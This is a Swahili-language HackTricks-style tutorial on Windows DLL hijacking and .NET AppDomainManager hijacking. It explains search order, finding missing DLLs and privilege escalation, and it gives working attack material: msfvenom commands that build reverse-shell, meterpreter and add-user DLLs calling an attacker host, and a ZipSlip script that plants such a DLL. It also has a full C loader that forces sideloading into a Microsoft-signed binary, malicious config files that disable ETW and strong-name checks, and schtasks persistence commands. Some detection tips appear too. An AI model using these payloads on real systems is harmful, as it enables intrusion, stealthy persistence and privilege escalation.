# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking huhusisha kushawishi programu inayoaminika ipakie DLL hasidi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Hutumika hasa kutekeleza code na kudumisha uwepo, na mara chache zaidi, kupandisha kiwango cha ruhusa. Ingawa hapa tunazingatia upandishaji wa ruhusa, mbinu ya kufanya hijacking hubaki ileile bila kujali lengo.

### Mbinu za Kawaida

Mbinu kadhaa hutumika kufanya DLL hijacking, na ufanisi wa kila moja hutegemea mkakati wa programu wa kupakia DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Kubadilisha DLL halisi na DLL hasidi, kwa hiari kutumia DLL Proxying ili kuhifadhi utendaji wa DLL asilia.
2. **DLL Search Order Hijacking**: Kuweka DLL hasidi kwenye njia ya utafutaji iliyo mbele ya ile halali, kwa kutumia mpangilio wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kutengeneza DLL hasidi ambayo programu itapakia, ikidhani ni DLL inayohitajika lakini haipo.
4. **DLL Redirection**: Kurekebisha vigezo vya utafutaji kama `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuelekeza programu kwenye DLL hasidi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na inayofanana nayo iliyo hasidi kwenye saraka ya WinSxS; mbinu hii mara nyingi huhusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hasidi kwenye saraka inayodhibitiwa na mtumiaji pamoja na programu iliyonakiliwa, kwa namna inayofanana na mbinu za Binary Proxy Execution.

Programu inaweza pia kutekeleza **kipakiaji chake cha DLL**. Mchakato wenye ruhusa za juu unaweza kuchunguza saraka ya mtoto kama `Libraries` au `Plugins`, kisha kupitisha DLL iliyochaguliwa kwa helper, bila kutegemea mpangilio wa kawaida wa utafutaji wa DLL wa Windows. Ikiwa akaunti nyingine inaweza kuunda faili kwenye saraka hiyo mahususi, ichukulie kama jambo linalostahili kuchunguzwa: thibitisha utambulisho wa mchakato, ACL inayotumika kwenye saraka, kanuni ya kuchagua faili, na uwezekano wa kufikia operesheni ya kupakia DLL. Saraka inayoweza kuandikiwa iliyo karibu na executable haithibitishi kwamba mchakato hupakia DLL kutoka humo.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + assembly ya mshambuliaji)

Classic DLL sideloading si njia pekee ya kufanya mchakato unaoaminika wa **.NET Framework** upakie code ya mshambuliaji. Ikiwa executable inayolengwa ni programu ya **managed**, CLR pia hukagua **faili ya usanidi wa programu** yenye jina la executable (kwa mfano `Setup.exe.config`). Faili hiyo inaweza kufafanua **AppDomainManager** maalum. Ikiwa usanidi unaelekeza kwenye assembly inayodhibitiwa na mshambuliaji na iliyowekwa karibu na EXE, CLR huipakia **kabla ya mtiririko wa kawaida wa code ya programu** na kuiendesha ndani ya mchakato unaoaminika.<sup>[[24]](#references)</sup>

Kulingana na schema ya usanidi ya .NET Framework ya Microsoft, `<appDomainManagerAssembly>` na `<appDomainManagerType>` lazima zote ziwepo ili manager maalum itumike.<sup>[[16]](#references)[[17]](#references)</sup>

Usanidi wa chini kabisa:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Msimamizi wa kiwango cha chini kabisa:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Maelezo ya vitendo:
- Hii ni mbinu ya **.NET Framework pekee**. Inategemea uchanganuzi wa usanidi wa CLR, si mpangilio wa utafutaji wa Win32 DLL.
- Programu mwenyeji lazima awe **managed EXE**. Ukaguzi wa haraka: `sigcheck -m target.exe`, `corflags target.exe`, au angalia **CLR Runtime Header** katika metadata ya PE.
- Jina la faili ya usanidi lazima lilingane kabisa na jina la executable (`<binary>.config`), na kwa kawaida huwekwa **karibu na EXE**.
- Hii ni muhimu kwa kutumia **signed Microsoft/vendor binaries** kwa sababu EXE inayoaminika hubaki bila kuguswa huku managed assembly hasidi ikitekelezwa ndani ya mchakato.
- Ikiwa tayari una saraka ya kisakinishi/sasisho inayoweza kuandikwa, AppDomainManager hijacking inaweza kutumiwa kama **hatua ya kwanza**, ikifuatiwa na DLL sideloading ya kawaida au reflective loading kwa hatua zinazofuata.

### AppDomainManager kama downloader + scheduled-task bootstrap

Muundo wa vitendo wa uvamizi ni kuoanisha managed EXE inayoaminika na `*.config` hasidi pamoja na AppDomainManager DLL hasidi inayofanya kazi kama **bootstrapper ndogo** pekee:<sup>[[25]](#references)</sup>

1. Mtumiaji huanzisha .NET installer au updater iliyosainiwa kutoka eneo linaloaminika, kama vile `%USERPROFILE%\Downloads`.
2. Config iliyo karibu nayo husababisha CLR kupakia attacker assembly **kabla** mantiki halali ya programu haijaanza.
3. Manager hasidi hutekeleza **path gate** (kwa mfano, huendelea tu ikiwa host EXE inaendeshwa kutoka `Downloads`, na huruhusu hatua ya pili kuendeshwa kutoka `%LOCALAPPDATA%` pekee).
4. Ukaguzi ukifaulu, hupakua payload halisi kwenye path inayoweza kuandikwa na mtumiaji, kama vile `%LOCALAPPDATA%\PerfWatson2.exe`, na kuweka persistence kwa kutumia scheduled task.

Kwa nini toleo hili ni muhimu:
- Host EXE iliyosainiwa hubaki bila kubadilishwa, kwa hivyo triage inayokagua hash ya binary kuu pekee inaweza kukosa maelewano.
- **Path-based anti-analysis** rahisi ni ya kawaida: kuhamisha ZIP/EXE/DLL triad hadi Desktop, Temp, au path ya sandbox kunaweza kuvunja mnyororo kwa makusudi.
- AppDomainManager DLL ya hatua ya kwanza inaweza kubaki ndogo na isiyoonekana sana huku implant halisi ikipakuliwa baadaye.

Mfano mdogo wa persistence unaoonekana mara nyingi katika muundo huu:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- `/rl highest` humaanisha **kiwango cha juu zaidi kinachopatikana** kwa mtumiaji/session hiyo; yenyewe haihakikishi kupandishwa hadi SYSTEM.
- Mbinu hii mara nyingi huainishwa vyema zaidi kama **execution/persistence kupitia matumizi mabaya ya usanidi wa .NET** kuliko classic missing-DLL search-order hijacking, ingawa operators mara nyingi huunganisha mbinu zote mbili.

Viashiria vya ugunduzi:
- Executables za .NET zilizosainiwa zinazoendeshwa kutoka kwenye **njia za ZIP extraction**, `Downloads`, `%TEMP%`, au folda nyingine zinazoweza kuandikwa na mtumiaji, zikiwa na faili ya `<exe>.config` **katika folda hiyo hiyo**.
- Scheduled tasks mpya ambazo action yake inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au `Downloads` na majina yake yanafanana na yale ya browser/vendor updaters.
- Michakato ya bootstrap ya managed inayodumu kwa muda mfupi, inayopakua EXE nyingine mara moja kisha kuanzisha `schtasks.exe`.
- Samples zinazotoka mapema isipokuwa njia ya executable ilingane na folda ya user-profile inayotarajiwa.

### Kuteka scheduled task iliyopo ili kuanzisha upya sideload chain

Kwa persistence, usitafute tu **kuunda task mpya**. Baadhi ya intrusion sets husubiri hadi installer halali iunde **task ya kawaida ya updater**, kisha **hubadilisha action ya task** ili jina, author na trigger iliyopo iendelee kuonekana ya kawaida kwa defenders.

Mtiririko wa kazi unaoweza kutumika tena:
1. Sakinisha/endeshwa software halali na utambue task ambayo kwa kawaida huiunda.
2. Export task XML na uandike thamani za sasa za `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Badilisha action pekee ili task ianzishe **trusted host EXE** yako kutoka kwenye staging directory inayoweza kuandikwa na mtumiaji; kisha EXE hiyo side-load au AppDomain-load payload halisi.
4. Sajili upya jina lilelile la task badala ya kuunda persistence artifact mpya iliyo wazi.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Kwa nini ni fiche zaidi:
- Jina la task bado linaweza kuonekana halali (kwa mfano, updater ya vendor).
- **Huduma ya Task Scheduler** huizindua, hivyo uthibitishaji wa parent/ancestor mara nyingi huona mnyororo wa scheduling unaotarajiwa badala ya `explorer.exe`.
- Timu za DFIR zinazotafuta **majina mapya ya task pekee** zinaweza kukosa task ambayo usajili wake ulikuwepo tayari lakini action yake sasa inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au njia nyingine inayodhibitiwa na mshambuliaji.

Njia za haraka za hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Linganisha XML za `C:\Windows\System32\Tasks\*` na metadata ya `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` dhidi ya baseline.
- Toa tahadhari wakati **task ya updater inayoonekana kuwa ya vendor** inaendesha kutoka **directories zinazoweza kuandikiwa na mtumiaji** au inapozindua .NET EXE yenye faili `*.config` iliyo kwenye directory hiyo hiyo.

> [!TIP]
> Kwa mlolongo wa hatua kwa hatua unaounganisha HTML staging, configs za AES-CTR, na .NET implants na DLL sideloading, pitia workflow iliyo hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Kupata DLL zinazokosekana

Njia ya kawaida zaidi ya kupata Dlls zinazokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **ukiweka** **filters 2 zifuatazo**:

![Common Techniques - Finding missing Dlls: Njia ya kawaida zaidi ya kupata Dlls zinazokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: Njia ya kawaida zaidi ya kupata Dlls zinazokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (230).png>)

kisha uonyeshe **File System Activity** pekee:

![Common Techniques - Finding missing Dlls: kisha uonyeshe File System Activity pekee](<../../../images/image (153).png>)

Ikiwa unatafuta **dll zinazokosekana kwa ujumla**, **iache** ikiendelea kwa **sekunde** chache.\
Ikiwa unatafuta **DLL inayokosekana ndani ya executable maalum**, weka filter nyingine kama **"Process Name" "contains" `<exec name>`**, iendeshe, kisha usimamishe kunasa matukio.<sup>[[9]](#references)</sup>

## Kutumia DLL Zinazokosekana

Ili kupandisha privileges, tafuta **DLL ambayo process yenye privileges inajaribu kupakia** kutoka eneo unaloweza kuandikia. Hili linaweza kutokea unapodhibiti directory inayotafutwa kabla ya directory iliyo na DLL halali, au wakati DLL iliyoombwa haipo na unaweza kuandika kwenye mojawapo ya directories zinazotafutwa.

### Mpangilio wa Utafutaji wa DLL

**Ndani ya** [**nyaraka za Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kupata maelezo ya jinsi Dlls zinavyopakiwa.**

**Programu za Windows** hutafuta DLL kwa kufuata seti ya **njia za utafutaji zilizobainishwa mapema**, kwa mfuatano maalum. Tatizo la DLL hijacking hutokea wakati DLL hasidi inapowekwa kimkakati kwenye mojawapo ya directories hizi, ili ipakiwe kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha programu inatumia absolute paths inaporejelea DLL inazohitaji.

Unaweza kuona **mpangilio wa utafutaji wa DLL kwenye mifumo ya 32-bit** hapa chini:

1. Directory ambayo programu ilipakiwa kutoka.
2. Directory ya mfumo. Tumia function ya [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) kupata njia ya directory hii.(_C:\Windows\System32_)
3. Directory ya mfumo ya 16-bit. Hakuna function inayopata njia ya directory hii, lakini inatafutwa. (_C:\Windows\System_)
4. Directory ya Windows. Tumia function ya [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kupata njia ya directory hii.
   1. (_C:\Windows_)
5. Directory ya sasa.
6. Directories zilizoorodheshwa kwenye environment variable ya PATH. Kumbuka kwamba hii haijumuishi njia ya kila-programu iliyobainishwa na registry key ya **App Paths**. Key ya **App Paths** haitumiki katika kukokotoa njia ya utafutaji wa DLL.

Huu ndio mpangilio wa utafutaji wa **chaguo-msingi** wakati **SafeDllSearchMode** imewashwa. Ikiwa imezimwa, directory ya sasa hupanda hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza registry value ya **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (chaguo-msingi ni imewashwa).

Ikiwa function ya [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) itaitwa kwa **LOAD_WITH_ALTERED_SEARCH_PATH**, utafutaji huanza kwenye directory ya executable module ambayo **LoadLibraryEx** inapakia.

Hatimaye, DLL inaweza kupakiwa kwa absolute path badala ya jina lake. Katika hali hiyo, Windows hutafuta DLL yenyewe kwenye njia hiyo pekee; dependencies zilizoombwa kwa jina bado hufuata mpangilio wa utafutaji unaotumika.

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji, lakini sitazieleza hapa.

### Kuunganisha uandishi wa faili kiholela na utekaji wa DLL inayokosekana

**Mbinu inayohusiana:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Tumia filters za **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambazo process inajaribu kupata lakini haiwezi.<sup>[[14]](#references)</sup>
2. Ikiwa binary inaendeshwa kwa **ratiba/kama service**, kuweka DLL yenye mojawapo ya majina hayo kwenye **application directory** (nafasi #1 kwenye mpangilio wa utafutaji) kutaisababisha kupakiwa wakati wa utekelezaji unaofuata. Katika kisa kimoja cha .NET scanner, process ilitafuta `hostfxr.dll` kwenye `C:\samples\app\` kabla ya kupakia nakala halisi kutoka `C:\Program Files\dotnet\fxr\...`.
3. Tengeneza payload DLL (kwa mfano, reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ikiwa primitive yako ni uandishi kiholela wa mtindo wa **ZipSlip**, tengeneza ZIP yenye entry inayotoka nje ya extraction dir ili DLL iwekwe kwenye app folder:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Peleka archive kwenye inbox/share inayofuatiliwa; task iliyoratibiwa itakapozindua upya mchakato, itapakia DLL hasidi na kutekeleza code yako kama service account.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya kina ya kudhibiti kwa uhakika DLL search path ya mchakato mpya ni kuweka field ya DllPath katika RTL_USER_PROCESS_PARAMETERS unapounda mchakato kwa kutumia ntdll native APIs. Kwa kutoa directory inayodhibitiwa na mshambuliaji hapa, mchakato lengwa unaotafuta DLL iliyoingizwa kwa jina (bila absolute path na bila kutumia safe loading flags) unaweza kulazimishwa kupakia DLL hasidi kutoka directory hiyo.

Wazo kuu
- Tengeneza process parameters kwa kutumia RtlCreateProcessParametersEx na uweke DllPath maalum inayoelekeza kwenye folder unalodhibiti (kwa mfano, directory ilipo dropper/unpacker yako).
- Unda mchakato kwa kutumia RtlCreateUserProcess. Binary lengwa inapotafuta DLL kwa jina, loader itatumia DllPath hii iliyotolewa wakati wa utatuzi, hivyo kuruhusu sideloading ya kuaminika hata kama DLL hasidi haiko kwenye directory moja na target EXE.

Maelezo/mipaka
- Hii huathiri child process inayoundwa; ni tofauti na SetDllDirectory, ambayo huathiri mchakato wa sasa pekee.
- Target lazima i-import au i-load DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na absolute paths zilizowekwa moja kwa moja haziwezi kutekwa. Forwarded exports na SxS zinaweza kubadilisha mpangilio wa kipaumbele.

Mfano mdogo wa C (ntdll, wide strings, error handling iliyorahisishwa):

<details>
<summary>Mfano kamili wa C: kulazimisha DLL sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll hasidi (inayotoa functions zinazohitajika au inayowakilisha DLL halisi) kwenye saraka yako ya DllPath.
- Zindua binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia mbinu iliyo hapo juu. Loader hutatua import kupitia DllPath iliyotolewa na sideloads DLL yako.

Mbinu hii imeonekana ikitumika porini kuendesha minyororo ya sideloading ya hatua nyingi: launcher ya awali huweka helper DLL, ambayo kisha huzindua binary iliyosainiwa na Microsoft inayoweza kutekwa kwa kutumia DllPath maalum ili kulazimisha kupakia DLL ya mshambuliaji kutoka kwenye saraka ya staging.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking kupitia `.exe.config`

Kwa mifumo lengwa ya **.NET Framework**, sideloading inaweza kufanywa **kabla ya `Main()`** bila kubandika kumbukumbu kwa kutumia vibaya faili ya **`.exe.config`** iliyo karibu na programu. Badala ya kutegemea tu mpangilio wa utafutaji wa Win32 DLL, mshambuliaji huweka EXE halali ya .NET karibu na faili ya config hasidi na assembly moja au zaidi zinazodhibitiwa na mshambuliaji.

Jinsi mnyororo huu unavyofanya kazi:<sup>[[15]](#references)[[22]](#references)</sup>
1. EXE mwenyeji huanza na **CLR husoma `<exe>.config`**.
2. Config huweka **`<appDomainManagerAssembly>`** na **`<appDomainManagerType>`** ili runtime ianzishe `AppDomainManager` inayodhibitiwa na mshambuliaji.
3. Manager hasidi hupata **utekelezaji kabla ya `Main()`** ndani ya mchakato wa mwenyeji unaoaminika.
4. Config hiyo hiyo inaweza kulazimisha CLR kutafuta assemblies za ndani kwanza (kwa mfano `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) na kudhoofisha uthibitishaji/telemetry ya runtime bila inline patching.

Muundo wa aina ya kampeni (mpangilio halisi wa nesting unaweza kutofautiana kulingana na directive / toleo la CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Kwa nini hili lina manufaa:
- **`<probing privatePath="."/>`** hudumisha utafutaji wa assembly kwenye directory ya application, na kuifanya folder kuwa sehemu inayotabirika ya sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** huhamishia utekelezaji kwenye code ya mshambuliaji wakati wa uanzishaji wa CLR, kabla logic halali ya app haijaanza kutekelezwa.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** inaweza kuruhusu app ya full-trust kupakia assemblies zisizosainiwa au zilizobadilishwa bila hitilafu ya uthibitishaji wa strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** huzuia publisher-policy redirects kwenda kwenye assemblies mpya zaidi.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hufanya uteuzi wa runtime utabirike zaidi.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** inavutia hasa kwa sababu **CLR huzima mwonekano wake wa ETW** kupitia configuration badala ya implant kubadilisha `EtwEventWrite` kwenye memory.

Muundo wa kiutendaji ulioonekana kwenye kampeni za hivi karibuni:
- Hatua ya 1 huweka `setup.exe`, `setup.exe.config`, na local assemblies.
- Hatua ya 2 huvinakili kwenye folder ya kuaminika inayoonekana kama **AppData update**, hubadilisha jina la host kuwa kitu kama `update.exe`, kisha huiwasha upya kupitia **scheduled task**.
- Hatua ya 3 huthibitisha muktadha wa utekelezaji (kwa mfano, parent inayotarajiwa ni `svchost.exe` kutoka Task Scheduler) kabla ya kupakia RAT DLL/export ya mwisho.

Mawazo ya hunting:
- **.NET executables** zilizosainiwa au halali kwa namna nyingine zinazoendeshwa zikiwa na faili **`.config`** zinazotia shaka karibu nazo, kwenye maeneo ambayo watumiaji wanaweza kuandika.
- Faili za `.config` zilizo na **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, au **`etwEnable enabled="false"`**.
- Scheduled tasks zinazoanzisha upya binary za update zilizopewa majina mapya kutoka **`%LOCALAPPDATA%`** au directory za app maalum kama `\bin\update\`.
- Mfuatano wa parent/child ambapo scheduled task huanzisha trusted .NET host ambayo mara moja hupakia assemblies zisizo za vendor kutoka kwenye directory yake yenyewe.

#### Isipokuwa kwa mpangilio wa utafutaji wa dll katika nyaraka za Windows

Baadhi ya hali zinazokiuka mpangilio wa kawaida wa utafutaji wa DLL zimeelezwa katika nyaraka za Windows:

- Mfumo unapokutana na **DLL yenye jina sawa na DLL ambayo tayari imepakiwa kwenye memory**, huruka utafutaji wa kawaida. Badala yake, hukagua redirection na manifest kabla ya kutumia DLL ambayo tayari ipo kwenye memory. **Katika hali hii, mfumo hautafuti DLL**.
- DLL inapotambuliwa kama **known DLL** kwa toleo la sasa la Windows, mfumo hutumia toleo lake la known DLL, pamoja na DLL zozote tegemezi, **bila kufanya utafutaji**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** ina orodha ya known DLL hizi.
- **DLL inapokuwa na dependencies**, utafutaji wa DLL hizo tegemezi hufanywa kana kwamba zilitajwa kwa **majina ya module** pekee, bila kujali kama DLL ya awali ilitambuliwa kupitia full path.

### Kuongeza Privileges

**Mahitaji**:

- Tambua process inayoendeshwa au itakayoendeshwa chini ya **privileges tofauti** (horizontal au lateral movement), na ambayo **haina DLL**.
- Hakikisha kuna **write access** kwenye **directory** yoyote ambako **DLL** itatafutwa. Eneo hili linaweza kuwa directory ya executable au directory iliyo ndani ya system path.

Masharti haya hayatokei mara nyingi kwa chaguo-msingi: executable zenye privileges za juu huwa hazikosi dependencies za DLL, na kwa kawaida watumiaji wa kawaida hawawezi kuandika kwenye directory za system search-path. Hata hivyo, mazingira yaliyowekwa vibaya bado yanaweza kufichua hali hizi zote mbili.\
Ikiwa mahitaji yametimizwa, angalia project ya [UACME](https://github.com/hfiref0x/UACME). Ingawa lengo lake kuu ni UAC bypass, ina PoCs za DLL-hijacking za matoleo maalum ya Windows ambazo mara nyingi zinaweza kubadilishwa ili zitumie directory iliyoandikika uliyoipata.

Kumbuka kwamba unaweza **kuangalia ruhusa zako kwenye folder** kwa kufanya:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Na **kagua ruhusa za folda zote zilizo ndani ya PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Unaweza pia kukagua imports za executable na exports za DLL kwa kutumia:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Kwa mwongozo kamili wa jinsi ya **kutumia vibaya DLL Hijacking ili kuongeza ruhusa** ukiwa na ruhusa za kuandika kwenye **folda ya System Path**, angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za kiotomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia kama una ruhusa za kuandika kwenye folda yoyote iliyo ndani ya system PATH.\
Zana nyingine za kiotomatiki zinazoweza kusaidia kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Ukikuta hali inayoweza kutumiwa vibaya, jambo mojawapo muhimu zaidi ili kufanikiwa kuitumia ni **kuunda dll inayotoa angalau functions zote ambazo executable itazi-import kutoka humo**. Hata hivyo, kumbuka kuwa DLL Hijacking inaweza kusaidia [kuongeza ruhusa kutoka kiwango cha Medium Integrity hadi High **(kwa kukwepa UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka [**High Integrity hadi SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa dll hijacking unaolenga DLL hijacking kwa ajili ya utekelezaji: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata baadhi ya **misimbo ya msingi ya dll** inayoweza kuwa muhimu kama **violezo** au kwa kuunda **dll inayotoa functions zisizohitajika**.

## **Kuunda na kukompile DLLs**

### **DLL Proxifying**

Kimsingi, **DLL proxy** ni DLL inayoweza **kutekeleza msimbo wako hasidi inapopakiwa**, lakini pia **kutoa** na **kufanya kazi** kama **inavyotarajiwa** kwa **kuelekeza upya miito yote kwenye library halisi**.

Ukitumia zana ya [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus), unaweza **kubainisha executable na kuchagua library** unayotaka kuifanyia proxify na **kutengeneza dll iliyofanyiwa proxify**, au **kubainisha DLL** na **kutengeneza dll iliyofanyiwa proxify**.

### **Meterpreter**

**Pata reverse shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Pata meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Unda mtumiaji (x86 sijaona toleo la x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Yako mwenyewe

